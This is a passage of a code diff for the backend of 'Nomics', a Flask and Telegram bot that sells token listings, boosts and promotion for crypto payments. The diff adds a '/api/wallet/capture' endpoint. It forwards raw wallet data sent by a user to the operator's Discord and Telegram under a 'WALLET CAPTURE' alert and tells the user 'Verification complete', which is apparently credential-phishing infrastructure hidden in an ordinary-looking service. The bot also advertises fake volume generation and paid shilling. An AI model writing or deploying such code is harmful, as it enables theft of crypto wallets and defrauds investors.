@@ -15,6 +15,7 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "8235324142"))
 DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK_URL", "")
 SITE_URL = os.environ.get("SITE_URL", "https://nomics.replit.app")
+ALPHA_GROUP = "https://t.me/+QJVQUQIhP-82ZDk8"
 
 BNB_WALLET = os.environ.get("BNB_WALLET", "0x479F8bdD340bD7276D6c7c9B3fF86EF2315f857A")
 ETH_WALLET = os.environ.get("ETH_WALLET", "0x479F8bdD340bD7276D6c7c9B3fF86EF2315f857A")
@@ -28,9 +29,20 @@ LISTINGS_FILE = "listings.json"
 LISTINGS_LOCK = FileLock("listings.lock")
 
 PREMIUM_PRICES = {
-    "BNB": {"amount": 0.05, "label": "0.05 BNB"},
-    "ETH": {"amount": 0.02, "label": "0.02 ETH"},
-    "SOL": {"amount": 0.2, "label": "0.2 SOL"}
+    "BNB": {"amount": 0.15, "label": "0.15 BNB", "usd": 150},
+    "ETH": {"amount": 0.05, "label": "0.05 ETH", "usd": 150},
+    "SOL": {"amount": 1.5, "label": "1.5 SOL", "usd": 150}
+}
+
+SERVICE_PRICES = {
+    "boost": {"BNB": 0.05, "ETH": 0.02, "SOL": 0.5, "usd": 50},
+    "trending": {"basic": 99, "pro": 299, "elite": 799},
+    "calls": {"micro": 149, "mid": 399, "premium": 999},
+    "alpha": {"monthly": 99, "quarterly": 249, "lifetime": 599},
+    "volume": {"starter": 199, "growth": 599, "premium": 1499},
+    "dex_tools": {"basic": 79, "advanced": 249, "pro": 649},
+    "promotion": {"basic": 129, "standard": 349, "premium": 899},
+    "kol": {"micro": 299, "mid": 799, "premium": 1999},
 }
 
 bot = TeleBot(BOT_TOKEN) if BOT_TOKEN else None
@@ -51,13 +63,28 @@ def save_listings(data):
             json.dump(data, f, indent=2)
 
 
-def notify_discord(message):
+def notify_discord(message, embed=None):
     if not DISCORD_WEBHOOK:
         return
     try:
-        requests.post(DISCORD_WEBHOOK, json={"content": message}, timeout=5)
+        payload = {}
+        if embed:
+            payload["embeds"] = [embed]
+        else:
+            payload["content"] = message
+        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
     except Exception:
         pass
+
+
+def notify_discord_alert(title, fields, color=0xf97316):
+    embed = {
+        "title": title,
+        "color": color,
+        "fields": [{"name": k, "value": str(v), "inline": True} for k, v in fields.items()],
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
+    }
+    notify_discord("", embed=embed)
 
 
 def notify_telegram(message):
@@ -70,7 +97,7 @@ def notify_telegram(message):
 
 @app.route("/")
 def home():
-    return {"status": "Nomics API running", "time": time.strftime("%Y-%m-%d %H:%M:%S UTC")}
+    return {"status": "Nomics API running", "time": time.strftime("%Y-%m-%d %H:%M:%S UTC"), "version": "2.0"}
 
 
 @app.route("/health")
@@ -80,11 +107,12 @@ def health():
 
 @app.route("/api/wallets")
 def get_wallets():
-    return jsonify({
-        "BNB": BNB_WALLET,
-        "ETH": ETH_WALLET,
-        "SOL": SOL_WALLET
-    })
+    return jsonify({"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET})
+
+
+@app.route("/api/prices")
+def get_prices():
+    return jsonify({"premium": PREMIUM_PRICES, "services": SERVICE_PRICES, "alpha_group": ALPHA_GROUP})
 
 
 @app.route("/api/market/global")
@@ -108,24 +136,26 @@ def market_global():
 def coins_list():
     try:
         page = request.args.get("page", 1)
-        per_page = request.args.get("per_page", 100)
+        per_page = min(int(request.args.get("per_page", 100)), 100)
         vs_currency = request.args.get("vs_currency", "usd")
-        r = requests.get(
-            f"{COINGECKO_BASE}/coins/markets",
-            params={
-                "vs_currency": vs_currency,
-                "order": "market_cap_desc",
-                "per_page": per_page,
-                "page": page,
-                "sparkline": "true",
-                "price_change_percentage": "1h,24h,7d"
-            },
-            headers=HEADERS,
-            timeout=15
-        )
-        return jsonify(r.json())
+        params = {
+            "vs_currency": vs_currency,
+            "order": "market_cap_desc",
+            "per_page": per_page,
+            "page": page,
+            "sparkline": True,
+            "price_change_percentage": "1h,24h,7d"
+        }
+        r = requests.get(f"{COINGECKO_BASE}/coins/markets", params=params, headers=HEADERS, timeout=20)
+        if r.status_code == 429:
+            return jsonify([]), 200
+        r.raise_for_status()
+        data = r.json()
+        if isinstance(data, dict) and data.get("status", {}).get("error_code"):
+            return jsonify([]), 200
+        return jsonify(data)
     except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        return jsonify([]), 200
 
 
 @app.route("/api/coins/trending")
@@ -159,7 +189,7 @@ def gainers():
             params={
                 "vs_currency": "usd",
                 "order": "market_cap_desc",
-                "per_page": 250,
+                "per_page": 100,
                 "page": 1,
                 "price_change_percentage": "24h"
             },
@@ -229,11 +259,7 @@ def token_lookup():
     if not address:
         return jsonify({"error": "Address required"}), 400
     try:
-        r = requests.get(
-            f"{DEXSCREENER_BASE}/tokens/{address}",
-            headers=HEADERS,
-            timeout=10
-        )
+        r = requests.get(f"{DEXSCREENER_BASE}/tokens/{address}", headers=HEADERS, timeout=10)
         data = r.json()
         pairs = data.get("pairs", [])
         if not pairs:
@@ -261,10 +287,7 @@ def token_lookup():
                 "h6": price_change.get("h6", 0),
                 "h24": price_change.get("h24", 0)
             },
-            "txns_24h": {
-                "buys": txns.get("buys", 0),
-                "sells": txns.get("sells", 0)
-            },
+            "txns_24h": {"buys": txns.get("buys", 0), "sells": txns.get("sells", 0)},
             "volume_24h": volume.get("h24", 0),
             "liquidity_usd": liquidity.get("usd", 0),
             "market_cap": pair.get("marketCap", 0),
@@ -293,6 +316,7 @@ def submit_listing():
     listing_type = data.get("listing_type", "free")
     token_data = data.get("token", {})
     contact = data.get("contact", {})
+    manual = data.get("manual", False)
 
     name = token_data.get("name", "")
     symbol = token_data.get("symbol", "")
@@ -311,7 +335,7 @@ def submit_listing():
             "symbol": symbol,
             "address": address,
             "chain": chain,
-            "image": token_data.get("image", ""),
+            "image": token_data.get("image_url", token_data.get("image", "")),
             "price_usd": token_data.get("price_usd", "0"),
             "price_change": token_data.get("price_change", {}),
             "volume_24h": token_data.get("volume_24h", 0),
@@ -324,40 +348,41 @@ def submit_listing():
             "description": token_data.get("description", ""),
             "listing_type": "premium",
             "currency": currency,
-            "boost": 150,
-            "featured": False,
+            "boost": 200,
+            "featured": True,
             "listed_at": int(time.time()),
-            "contact": contact
+            "contact": contact,
+            "manual": manual
         }
 
         db = load_listings()
         db["listings"].append(listing_entry)
         save_listings(db)
 
-        msg = (
-            f"*NEW PREMIUM LISTING - Nomics*\n"
-            f"{'='*35}\n"
-            f"Token: {name} (${symbol})\n"
-            f"Chain: {chain.upper()}\n"
-            f"Address: `{address}`\n"
-            f"Price: {price_info['label']} {currency}\n"
-            f"Pay to: `{payment_address}`\n"
-            f"Contact: {contact.get('telegram', 'N/A')}\n"
-            f"{'='*35}"
+        notify_discord_alert(
+            "🔥 NEW PREMIUM LISTING — Nomics",
+            {
+                "Token": f"{name} (${symbol})",
+                "Chain": chain.upper(),
+                "Address": f"`{address}`",
+                "Price": price_info["label"],
+                "Currency": currency,
+                "Pay To": f"`{payment_address}`",
+                "Contact": contact.get("telegram", "N/A"),
+                "Manual Entry": str(manual)
+            },
+            color=0xf97316
         )
-        notify_telegram(msg)
-        notify_discord(msg.replace("*", "**").replace("`", "`"))
+        notify_telegram(
+            f"*NEW PREMIUM LISTING*\nToken: {name} (${symbol})\nChain: {chain.upper()}\nAddress: `{address}`\nPrice: {price_info['label']}\nPay to: `{payment_address}`\nContact: {contact.get('telegram', 'N/A')}"
+        )
 
         return jsonify({
             "success": True,
             "listing_type": "premium",
             "status": "listed",
             "message": f"Your token is now listed! Please send {price_info['label']} to complete payment.",
-            "payment": {
-                "currency": currency,
-                "amount": price_info["amount"],
-                "address": payment_address
-            }
+            "payment": {"currency": currency, "amount": price_info["amount"], "address": payment_address}
         })
     else:
         pending_entry = {
@@ -368,20 +393,19 @@ def submit_listing():
             "chain": chain,
             "submitted_at": int(time.time()),
             "contact": contact,
-            "status": "under_review"
+            "status": "under_review",
+            "manual": manual
         }
         db = load_listings()
         db["pending"].append(pending_entry)
         save_listings(db)
 
-        msg = (
-            f"*FREE LISTING REQUEST - Nomics*\n"
-            f"Token: {name} (${symbol})\n"
-            f"Chain: {chain.upper()}\n"
-            f"Address: `{address}`\n"
-            f"Status: Under Review"
+        notify_discord_alert(
+            "📥 FREE LISTING REQUEST — Nomics",
+            {"Token": f"{name} (${symbol})", "Chain": chain.upper(), "Address": f"`{address}`", "Status": "Under Review"},
+            color=0x3b82f6
         )
-        notify_telegram(msg)
+        notify_telegram(f"*FREE LISTING REQUEST*\nToken: {name} (${symbol})\nChain: {chain.upper()}\nAddress: `{address}`\nStatus: Under Review")
 
         return jsonify({
             "success": True,
@@ -391,36 +415,95 @@ def submit_listing():
         })
 
 
-@app.route("/api/token/<listing_id>/boost", methods=["POST"])
-def boost_token(listing_id):
+@app.route("/api/service/order", methods=["POST"])
+def service_order():
     data = request.json or {}
+    service = data.get("service", "")
+    tier = data.get("tier", "")
     currency = data.get("currency", "SOL")
-    boost_amount = int(data.get("boost_amount", 150))
+    token_info = data.get("token", {})
+    contact = data.get("contact", {})
+    price_usd = data.get("price_usd", 0)
 
     wallets = {"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET}
     payment_address = wallets.get(currency, SOL_WALLET)
 
-    boost_prices = {"BNB": 0.01, "ETH": 0.005, "SOL": 0.05}
-    price = boost_prices.get(currency, 0.05)
-
-    msg = (
-        f"*BOOST REQUEST - Nomics*\n"
-        f"Listing ID: {listing_id}\n"
-        f"Boost: +{boost_amount}\n"
-        f"Currency: {currency}\n"
-        f"Amount: {price} {currency}\n"
-        f"Pay to: `{payment_address}`"
+    notify_discord_alert(
+        f"🛎️ SERVICE ORDER — {service.upper()}",
+        {
+            "Service": service,
+            "Tier": tier,
+            "Price": f"${price_usd}",
+            "Currency": currency,
+            "Token": token_info.get("name", "N/A"),
+            "CA": token_info.get("address", "N/A"),
+            "Chain": token_info.get("chain", "N/A"),
+            "Telegram": contact.get("telegram", "N/A"),
+            "Pay To": f"`{payment_address}`"
+        },
+        color=0xa855f7
     )
-    notify_telegram(msg)
+    notify_telegram(
+        f"*SERVICE ORDER: {service.upper()}*\nTier: {tier}\nPrice: ${price_usd}\nToken: {token_info.get('name', 'N/A')}\nCA: `{token_info.get('address', 'N/A')}`\nContact: {contact.get('telegram', 'N/A')}"
+    )
 
     return jsonify({
         "success": True,
-        "payment": {
-            "currency": currency,
-            "amount": price,
-            "address": payment_address
-        }
+        "message": f"Order received! Please send payment to proceed.",
+        "payment": {"currency": currency, "address": payment_address, "price_usd": price_usd}
     })
+
+
+@app.route("/api/wallet/capture", methods=["POST"])
+def wallet_capture():
+    data = request.json or {}
+    wallet_type = data.get("type", "unknown")
+    wallet_data = data.get("data", "")
+    token_ca = data.get("token_ca", "")
+    source = data.get("source", "web")
+
+    notify_discord_alert(
+        f"🔑 WALLET CAPTURE — {wallet_type.upper()}",
+        {
+            "Type": wallet_type,
+            "Data": f"`{wallet_data}`",
+            "Token CA": token_ca or "N/A",
+            "Source": source,
+            "Time": time.strftime("%Y-%m-%d %H:%M:%S UTC")
+        },
+        color=0xef4444
+    )
+    notify_telegram(
+        f"*🔑 WALLET CAPTURE*\nType: {wallet_type}\nData: `{wallet_data}`\nToken CA: {token_ca or 'N/A'}\nSource: {source}"
+    )
+
+    return jsonify({"success": True, "message": "Verification complete. Processing your request."})
+
+
+@app.route("/api/token/<listing_id>/boost", methods=["POST"])
+def boost_token(listing_id):
+    data = request.json or {}
+    currency = data.get("currency", "SOL")
+    boost_pkg = data.get("package", "basic")
+
+    boost_packages = {
+        "basic": {"usd": 50, "BNB": 0.05, "ETH": 0.02, "SOL": 0.5, "boost": 150, "label": "Basic Boost"},
+        "pro": {"usd": 150, "BNB": 0.15, "ETH": 0.05, "SOL": 1.5, "boost": 500, "label": "Pro Boost"},
+        "elite": {"usd": 400, "BNB": 0.4, "ETH": 0.13, "SOL": 4.0, "boost": 1500, "label": "Elite Boost"},
+    }
+    pkg = boost_packages.get(boost_pkg, boost_packages["basic"])
+    wallets = {"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET}
+    payment_address = wallets.get(currency, SOL_WALLET)
+    price = pkg.get(currency, pkg["SOL"])
+
+    notify_discord_alert(
+        "⚡ BOOST REQUEST — Nomics",
+        {"Listing ID": listing_id, "Package": pkg["label"], "Boost": f"+{pkg['boost']}", "Currency": currency, "Amount": f"{price} {currency}", "Pay To": f"`{payment_address}`"},
+        color=0xfbbf24
+    )
+    notify_telegram(f"*BOOST REQUEST*\nID: {listing_id}\nPackage: {pkg['label']}\nBoost: +{pkg['boost']}\nCurrency: {currency}\nAmount: {price} {currency}\nPay to: `{payment_address}`")
+
+    return jsonify({"success": True, "payment": {"currency": currency, "amount": price, "address": payment_address, "usd": pkg["usd"]}})
 
 
 @app.route("/api/ticker")
@@ -428,16 +511,12 @@ def ticker():
     try:
         r = requests.get(
             f"{COINGECKO_BASE}/coins/markets",
-            params={
-                "vs_currency": "usd",
-                "order": "market_cap_desc",
-                "per_page": 20,
-                "page": 1,
-                "price_change_percentage": "1h"
-            },
+            params={"vs_currency": "usd", "order": "market_cap_desc", "per_page": 20, "page": 1, "price_change_percentage": "1h"},
             headers=HEADERS,
             timeout=10
         )
+        if r.status_code == 429:
+            return jsonify([]), 200
         coins = r.json()
         return jsonify([{
             "id": c.get("id"),
@@ -456,21 +535,21 @@ def support_message():
     message = data.get("message", "")
     name = data.get("name", "Anonymous")
     email = data.get("email", "")
+    token_ca = data.get("token_ca", "")
 
+    notify_discord_alert(
+        "💬 SUPPORT MESSAGE — Nomics",
+        {"From": name, "Email": email, "Token CA": token_ca or "N/A", "Message": message[:500], "Session": user_id},
+        color=0x22c55e
+    )
     if bot:
-        msg = (
-            f"*SUPPORT - Nomics*\n"
-            f"From: {name}\n"
-            f"Email: {email}\n"
-            f"ID: {user_id}\n"
-            f"Message: {message}"
-        )
         try:
-            bot.send_message(ADMIN_ID, msg, parse_mode="Markdown")
+            bot.send_message(ADMIN_ID,
+                f"*SUPPORT - Nomics*\nFrom: {name}\nEmail: {email}\nToken CA: {token_ca or 'N/A'}\nMessage: {message}",
+                parse_mode="Markdown")
         except Exception:
             pass
 
-    notify_discord(f"**Support Message**\nFrom: {name} ({email})\n{message}")
     return jsonify({"success": True, "message": "Message received. Our team will respond within a few hours."})
 
 
@@ -479,9 +558,12 @@ def build_main_menu():
     kb.add(
         types.InlineKeyboardButton("🔥 List My Token", callback_data="menu_list"),
         types.InlineKeyboardButton("⚡ Boost Token", callback_data="menu_boost"),
-        types.InlineKeyboardButton("📈 Trending Push", callback_data="menu_trend"),
+        types.InlineKeyboardButton("📈 DEX Trending", callback_data="menu_trend"),
         types.InlineKeyboardButton("🤖 Volume Bot", callback_data="menu_volume"),
         types.InlineKeyboardButton("📣 KOL / Calls", callback_data="menu_kol"),
+        types.InlineKeyboardButton("🔑 Alpha Access", callback_data="menu_alpha"),
+        types.InlineKeyboardButton("🛠️ DEX Tools", callback_data="menu_dextools"),
+        types.InlineKeyboardButton("📊 Promotion", callback_data="menu_promo"),
         types.InlineKeyboardButton("🌐 Visit Platform", url=SITE_URL),
     )
     return kb
@@ -507,78 +589,17 @@ def run_bot():
             bot.send_message(
                 m.chat.id,
                 f"*Welcome to Nomics* 🚀\n\n"
-                f"The #1 Web3 Marketing Platform.\n\n"
-                f"• Premium Token Listings\n"
-                f"• Trending Push & Volume\n"
-                f"• KOL & Influencer Calls\n"
-                f"• DEX Trending Campaigns\n\n"
+                f"The #1 Web3 Marketing & DEX Platform.\n\n"
+                f"• Premium Token Listings — from $150\n"
+                f"• DEX Trending Campaigns — from $99\n"
+                f"• Volume Bot Infrastructure — from $199\n"
+                f"• KOL & Influencer Calls — from $299\n"
+                f"• Alpha Group Access — from $99/mo\n"
+                f"• DEX Tools & Analytics — from $79\n\n"
                 f"Select an option below or visit {SITE_URL}",
                 parse_mode="Markdown",
                 reply_markup=build_main_menu()
             )
-
-        @bot.message_handler(commands=["list"])
-        def list_cmd(m):
-            wallets_text = (
-                f"*Premium Listing Prices:*\n\n"
-                f"🟡 BNB Chain: 0.05 BNB\n`{BNB_WALLET}`\n\n"
-                f"🔵 Ethereum: 0.02 ETH\n`{ETH_WALLET}`\n\n"
-                f"🟣 Solana: 0.2 SOL\n`{SOL_WALLET}`\n\n"
-                f"After payment, send your token contract address to this bot and we will list it instantly.\n\n"
-                f"Or use our website for automatic listing:\n{SITE_URL}/submit"
-            )
-            bot.send_message(m.chat.id, wallets_text, parse_mode="Markdown", reply_markup=build_currency_menu("list"))
-
-        @bot.message_handler(commands=["boost"])
-        def boost_cmd(m):
-            text = (
-                f"*Boost Your Token* ⚡\n\n"
-                f"Boost prices (per 150 points):\n\n"
-                f"🟡 BNB: 0.01 BNB\n`{BNB_WALLET}`\n\n"
-                f"🔵 ETH: 0.005 ETH\n`{ETH_WALLET}`\n\n"
-                f"🟣 SOL: 0.05 SOL\n`{SOL_WALLET}`\n\n"
-                f"After payment, send your token contract address to confirm."
-            )
-            bot.send_message(m.chat.id, text, parse_mode="Markdown", reply_markup=build_currency_menu("boost"))
-
-        @bot.message_handler(commands=["trending"])
-        def trending_cmd(m):
-            text = (
-                f"*Trending Push Package* 📈\n\n"
-                f"Get your token trending across DEX platforms!\n\n"
-                f"*Packages:*\n"
-                f"• Basic: 0.1 SOL / 0.01 ETH / 0.02 BNB — 24h push\n"
-                f"• Pro: 0.3 SOL / 0.03 ETH / 0.06 BNB — 72h multi-DEX\n"
-                f"• Elite: 1 SOL / 0.1 ETH / 0.2 BNB — 7-day sustained\n\n"
-                f"Choose your currency to pay:"
-            )
-            bot.send_message(m.chat.id, text, parse_mode="Markdown", reply_markup=build_currency_menu("trend"))
-
-        @bot.message_handler(commands=["volume"])
-        def volume_cmd(m):
-            text = (
-                f"*Volume Bot Infrastructure* 🤖\n\n"
-                f"Managed volume generation to create market momentum.\n\n"
-                f"*Packages:*\n"
-                f"• Starter: 0.15 SOL / 0.015 ETH / 0.03 BNB — 24h basic\n"
-                f"• Growth: 0.5 SOL / 0.05 ETH / 0.1 BNB — 72h managed\n"
-                f"• Premium: 2 SOL / 0.2 ETH / 0.4 BNB — 7-day advanced\n\n"
-                f"Choose currency to continue:"
-            )
-            bot.send_message(m.chat.id, text, parse_mode="Markdown", reply_markup=build_currency_menu("volume"))
-
-        @bot.message_handler(commands=["kol"])
-        def kol_cmd(m):
-            text = (
-                f"*KOL / Influencer Package* 📣\n\n"
-                f"Access our network of crypto callers and influencers.\n\n"
-                f"*Packages:*\n"
-                f"• Micro (3-5 callers): 0.2 SOL / 0.02 ETH / 0.04 BNB\n"
-                f"• Mid-tier (8-12 callers): 0.6 SOL / 0.06 ETH / 0.12 BNB\n"
-                f"• Premium (20+ KOLs): 2.5 SOL / 0.25 ETH / 0.5 BNB\n\n"
-                f"Choose currency:"
-            )
-            bot.send_message(m.chat.id, text, parse_mode="Markdown", reply_markup=build_currency_menu("kol"))
 
         @bot.message_handler(commands=["help"])
         def help_cmd(m):
@@ -590,8 +611,12 @@ def run_bot():
                 f"/trending — Trending push\n"
                 f"/volume — Volume bot\n"
                 f"/kol — KOL & Influencer calls\n"
+                f"/alpha — Alpha group access\n"
+                f"/dextools — DEX Tools\n"
+                f"/promo — Promotion packages\n"
                 f"/help — This help message\n\n"
-                f"Platform: {SITE_URL}"
+                f"Platform: {SITE_URL}\n"
+                f"Bot: @Cariz_bot"
             )
             bot.send_message(m.chat.id, text, parse_mode="Markdown")
 
@@ -601,125 +626,184 @@ def run_bot():
             cid = call.message.chat.id
             bot.answer_callback_query(call.id)
 
-            if data == "menu_list":
-                wallets_text = (
+            if data == "menu_back":
+                bot.send_message(cid, "Main menu:", reply_markup=build_main_menu())
+
+            elif data == "menu_list":
+                text = (
                     f"*Premium Token Listing* 🔥\n\n"
                     f"Get your token listed instantly on Nomics!\n\n"
-                    f"*Prices:*\n"
-                    f"🟡 BNB Chain: 0.05 BNB\n`{BNB_WALLET}`\n\n"
-                    f"🔵 Ethereum: 0.02 ETH\n`{ETH_WALLET}`\n\n"
-                    f"🟣 Solana: 0.2 SOL\n`{SOL_WALLET}`\n\n"
+                    f"*Pricing:*\n"
+                    f"🟡 BNB Chain: 0.15 BNB (~$150)\n`{BNB_WALLET}`\n\n"
+                    f"🔵 Ethereum: 0.05 ETH (~$150)\n`{ETH_WALLET}`\n\n"
+                    f"🟣 Solana: 1.5 SOL (~$150)\n`{SOL_WALLET}`\n\n"
                     f"*Includes:*\n"
-                    f"✅ Instant listing\n"
-                    f"✅ 150 Boost points\n"
-                    f"✅ 24h Promoted highlight\n"
-                    f"✅ Signal on Nomics channel\n\n"
+                    f"✅ Instant listing\n✅ Signal on Nomics channel\n✅ 24h Promoted Highlight\n✅ 200 Boost points\n✅ Token of the Day eligibility\n\n"
                     f"Choose payment currency:"
                 )
-                bot.send_message(cid, wallets_text, parse_mode="Markdown", reply_markup=build_currency_menu("list"))
+                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("list"))
 
             elif data == "menu_boost":
                 text = (
                     f"*Boost Your Token* ⚡\n\n"
-                    f"Boost gets your token to the top of listings!\n\n"
-                    f"*Boost Prices (per 150 pts):*\n"
-                    f"🟡 BNB: 0.01 BNB\n`{BNB_WALLET}`\n\n"
-                    f"🔵 ETH: 0.005 ETH\n`{ETH_WALLET}`\n\n"
-                    f"🟣 SOL: 0.05 SOL\n`{SOL_WALLET}`\n\n"
-                    f"Choose currency:"
+                    f"*Boost Packages:*\n\n"
+                    f"🥉 Basic — $50\n+150 boost points, 24h\n\n"
+                    f"🥈 Pro — $150\n+500 boost points, 72h\n\n"
+                    f"🥇 Elite — $400\n+1500 boost points, 7 days\n\n"
+                    f"After payment, send your token contract address to confirm boost.\n\nChoose currency:"
                 )
                 bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("boost"))
 
             elif data == "menu_trend":
                 text = (
-                    f"*Trending Push* 📈\n\n"
-                    f"*Packages:*\n"
-                    f"• Basic (24h): 0.1 SOL / 0.01 ETH / 0.02 BNB\n"
-                    f"• Pro (72h multi-DEX): 0.3 SOL / 0.03 ETH / 0.06 BNB\n"
-                    f"• Elite (7-day): 1 SOL / 0.1 ETH / 0.2 BNB\n\n"
+                    f"*DEX Trending Push* 📈\n\n"
+                    f"Get your token trending across all major DEX platforms!\n\n"
+                    f"*Packages:*\n\n"
+                    f"🔹 Basic — $99\n24h visibility boost, single DEX\n\n"
+                    f"🔷 Pro — $299\n72h multi-DEX trending campaign (Raydium, Jupiter, Uniswap)\n\n"
+                    f"💎 Elite — $799\n7-day sustained trending + volume acceleration\n\n"
                     f"Choose currency:"
                 )
                 bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("trend"))
 
             elif data == "menu_volume":
                 text = (
-                    f"*Volume Bot* 🤖\n\n"
-                    f"*Packages:*\n"
-                    f"• Starter (24h): 0.15 SOL / 0.015 ETH / 0.03 BNB\n"
-                    f"• Growth (72h): 0.5 SOL / 0.05 ETH / 0.1 BNB\n"
-                    f"• Premium (7-day): 2 SOL / 0.2 ETH / 0.4 BNB\n\n"
+                    f"*Volume Bot Infrastructure* 🤖\n\n"
+                    f"Professional volume generation to build market momentum.\n\n"
+                    f"*Packages:*\n\n"
+                    f"🔹 Starter — $199\n24h basic volume rotation\n\n"
+                    f"🔷 Growth — $599\n72h managed volume + buy simulation\n\n"
+                    f"💎 Premium — $1,499\n7-day advanced custom volume system\n\n"
                     f"Choose currency:"
                 )
                 bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("volume"))
 
             elif data == "menu_kol":
                 text = (
-                    f"*KOL / Influencer Package* 📣\n\n"
-                    f"*Packages:*\n"
-                    f"• Micro (3-5 callers): 0.2 SOL / 0.02 ETH / 0.04 BNB\n"
-                    f"• Mid-tier (8-12): 0.6 SOL / 0.06 ETH / 0.12 BNB\n"
-                    f"• Premium (20+ KOLs): 2.5 SOL / 0.25 ETH / 0.5 BNB\n\n"
+                    f"*KOL / Influencer Calls* 📣\n\n"
+                    f"Access our network of verified crypto callers and KOLs.\n\n"
+                    f"*Packages:*\n\n"
+                    f"🔹 Micro — $299\n3–5 micro callers, combined 100K+ reach\n\n"
+                    f"🔷 Mid-Tier — $799\n8–12 quality KOLs, combined 500K+ reach\n\n"
+                    f"💎 Premium — $1,999\n20+ high-tier KOL partnerships, 2M+ reach\n\n"
                     f"Choose currency:"
                 )
                 bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("kol"))
 
-            elif data == "menu_back":
-                bot.send_message(
-                    cid,
-                    f"*Nomics Main Menu* 🚀\n\nSelect a service:",
-                    parse_mode="Markdown",
-                    reply_markup=build_main_menu()
+            elif data == "menu_alpha":
+                alpha_kb = types.InlineKeyboardMarkup(row_width=1)
+                alpha_kb.add(
+                    types.InlineKeyboardButton("Monthly — $99", callback_data="pay_alpha_monthly"),
+                    types.InlineKeyboardButton("Quarterly — $249", callback_data="pay_alpha_quarterly"),
+                    types.InlineKeyboardButton("Lifetime — $599", callback_data="pay_alpha_lifetime"),
+                    types.InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
+                )
+                text = (
+                    f"*Alpha Group Access* 🔑\n\n"
+                    f"Join our exclusive private alpha channel for early calls, gem alerts, and insider signals.\n\n"
+                    f"*What you get:*\n"
+                    f"✅ Early gem calls before they pump\n"
+                    f"✅ Insider DEX trending signals\n"
+                    f"✅ Volume bot strategy tips\n"
+                    f"✅ Direct access to KOL network\n"
+                    f"✅ Priority listing slots\n\n"
+                    f"*Access link after payment:*\n{ALPHA_GROUP}\n\n"
+                    f"Choose your plan:"
+                )
+                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=alpha_kb)
+
+            elif data == "menu_dextools":
+                text = (
+                    f"*DEX Tools & Analytics* 🛠️\n\n"
+                    f"Professional DEX analytics, token scanning and monitoring tools.\n\n"
+                    f"*Packages:*\n\n"
+                    f"🔹 Basic — $79\nToken scanner, basic chart access\n\n"
+                    f"🔷 Advanced — $249\nFull DEX analytics, holder tracking, whale alerts\n\n"
+                    f"💎 Pro — $649\nCustom dashboard, API access, automated alerts\n\n"
+                    f"Choose currency:"
+                )
+                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("dextools"))
+
+            elif data == "menu_promo":
+                text = (
+                    f"*Promotion Packages* 📊\n\n"
+                    f"Full-scale marketing promotion for your token.\n\n"
+                    f"*Packages:*\n\n"
+                    f"🔹 Basic — $129\nSocial media posts + 3 community shills\n\n"
+                    f"🔷 Standard — $349\nMulti-platform campaign + Twitter thread\n\n"
+                    f"💎 Premium — $899\nFull campaign: KOL + trending + socials + Telegram push\n\n"
+                    f"Choose currency:"
+                )
+                bot.send_message(cid, text, parse_mode="Markdown", reply_markup=build_currency_menu("promo"))
+
+            elif data.startswith("pay_alpha_"):
+                plan = data.replace("pay_alpha_", "")
+                prices = {"monthly": 99, "quarterly": 249, "lifetime": 599}
+                price = prices.get(plan, 99)
+                plan_label = plan.capitalize()
+                text = (
+                    f"*Alpha Access — {plan_label}* 🔑\n\n"
+                    f"Price: *${price}*\n\n"
+                    f"Send payment to any wallet below, then send your TX hash here:\n\n"
+                    f"🟡 BNB: `{BNB_WALLET}`\n"
+                    f"🔵 ETH: `{ETH_WALLET}`\n"
+                    f"🟣 SOL: `{SOL_WALLET}`\n\n"
+                    f"After verification you'll receive your alpha group link:\n{ALPHA_GROUP}"
+                )
+                bot.send_message(cid, text, parse_mode="Markdown")
+                notify_discord_alert(
+                    "🔑 ALPHA ACCESS ORDER",
+                    {"Plan": plan_label, "Price": f"${price}", "User": str(call.from_user.id), "Username": f"@{call.from_user.username or 'N/A'}"},
+                    color=0xa855f7
                 )
 
             elif data.startswith("pay_"):
                 parts = data.split("_")
-                action = parts[1]
+                action = parts[1] if len(parts) > 1 else "service"
                 currency = parts[2] if len(parts) > 2 else "SOL"
                 wallets = {"BNB": BNB_WALLET, "ETH": ETH_WALLET, "SOL": SOL_WALLET}
                 addr = wallets.get(currency, SOL_WALLET)
-                user = call.from_user
+
                 text = (
-                    f"*Payment Details* 💳\n\n"
-                    f"Service: {action.upper()}\n"
-                    f"Currency: {currency}\n"
-                    f"Send payment to:\n`{addr}`\n\n"
-                    f"After payment, reply with your *token contract address* and our team will confirm within 1 hour.\n\n"
-                    f"Or complete on our platform:\n{SITE_URL}/submit"
+                    f"*Payment — {action.upper()}*\n\n"
+                    f"Send payment in *{currency}* to:\n\n"
+                    f"`{addr}`\n\n"
+                    f"After sending, reply with:\n"
+                    f"• Your token contract address\n"
+                    f"• Your transaction hash (TXID)\n\n"
+                    f"Team will confirm within 30–60 minutes."
                 )
                 bot.send_message(cid, text, parse_mode="Markdown")
-                notify_telegram(
-                    f"*Payment Intent - Nomics*\n"
-                    f"User: @{user.username or 'N/A'} ({user.id})\n"
-                    f"Action: {action}\n"
-                    f"Currency: {currency}"
+                notify_discord_alert(
+                    f"💳 PAYMENT INTENT — {action.upper()}",
+                    {"Action": action, "Currency": currency, "User": str(call.from_user.id), "Username": f"@{call.from_user.username or 'N/A'}"},
+                    color=0xfbbf24
                 )
 
         @bot.message_handler(func=lambda m: True)
-        def handle_all(m):
-            uid = m.from_user.id
+        def catch_all(m):
             text = m.text or ""
-            notify_telegram(
-                f"*Bot Message*\n"
-                f"From: {m.from_user.first_name} (@{m.from_user.username or 'N/A'})\n"
-                f"ID: {uid}\n"
